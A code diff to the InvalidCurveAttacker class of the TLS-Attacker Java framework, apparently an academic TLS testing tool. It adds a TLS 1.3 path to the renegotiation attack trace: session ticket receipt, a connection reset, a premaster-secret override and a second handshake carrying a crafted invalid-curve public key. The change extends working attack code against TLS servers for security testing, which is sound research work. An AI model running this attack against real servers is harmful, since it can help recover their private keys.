@@ -29,11 +29,14 @@ import de.rub.nds.tlsattacker.core.crypto.ec.FieldElementFp;
 import de.rub.nds.tlsattacker.core.crypto.ec.Point;
 import de.rub.nds.tlsattacker.core.crypto.ec.PointFormatter;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
+import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.CertificateVerifyMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.NewSessionTicketMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.extension.ExtensionMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.extension.KeyShareExtensionMessage;
@@ -42,10 +45,16 @@ import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
+import de.rub.nds.tlsattacker.core.workflow.action.ChangeDefaultPreMasterSecretAction;
+import de.rub.nds.tlsattacker.core.workflow.action.MessageAction;
+import de.rub.nds.tlsattacker.core.workflow.action.MessageActionFactory;
 import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
+import de.rub.nds.tlsattacker.core.workflow.action.ResetConnectionAction;
 import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
+import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
+import de.rub.nds.tlsattacker.transport.ConnectionEndType;
 import java.math.BigInteger;
 import java.util.LinkedList;
 import java.util.List;
@@ -130,7 +139,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             }
             try {
                 WorkflowTrace trace = executeProtocolFlow(); 
-                
+
                 //expect 2 of each for successfull attack in renegotiation
                 int receivedServerHellos = 0;
                 int receivedServerFins = 0; 
@@ -144,7 +153,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                     }
                     else if(hMsg.getHandshakeMessageType() == HandshakeMessageType.FINISHED)
                     {
-                       receivedServerFins++; 
+                        receivedServerFins++; 
                     }
                 }
                 if (getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13 && (receivedServerHellos < 1 || (config.isAttackInRenegotiation() && receivedServerHellos < 2))) {
@@ -196,7 +205,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         responseFingerprints.add(ResponseExtractor.getFingerprint(state)); 
         if(state.getTlsContext().getServerEcPublicKey() != null)
         {
-            getReceivedEcPublicKeys().add(state.getTlsContext().getServerEcPublicKey()); 
+            getReceivedEcPublicKeys().add(state.getTlsContext().getServerEcPublicKey());
         }
         return trace;
     }
@@ -241,14 +250,38 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     
     private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
     {
+        WorkflowTrace trace;
         Config tlsConfig = getTlsConfig();
-        tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
-        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION,
+        if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
+        {
+            tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
+            trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
                 RunningModeType.CLIENT);
-        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage)WorkflowTraceUtil.getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
-        message.setPublicKey(serializedPublicKey);
-        message.prepareComputations();
-        message.getComputations().setPremasterSecret(pms);
+            trace.addTlsAction(new ReceiveAction(new NewSessionTicketMessage(false)));
+            trace.addTlsAction(new ResetConnectionAction());
+            
+            ChangeDefaultPreMasterSecretAction cPMS = new ChangeDefaultPreMasterSecretAction();
+            cPMS.setNewValue(explicitPMS);
+            trace.addTlsAction(cPMS);
+            
+            tlsConfig.setAddPreSharedKeyExtension(Boolean.TRUE);
+            WorkflowTrace secondHandshake = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
+            
+            for (TlsAction action : secondHandshake.getTlsActions()) 
+            {
+                trace.addTlsAction(action);
+            }
+        }
+        else
+        {           
+            tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
+            trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION,
+                RunningModeType.CLIENT);
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage)WorkflowTraceUtil.getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+            message.setPublicKey(serializedPublicKey);
+            message.prepareComputations();
+            message.getComputations().setPremasterSecret(pms);
+        }
 
         return trace;
     }
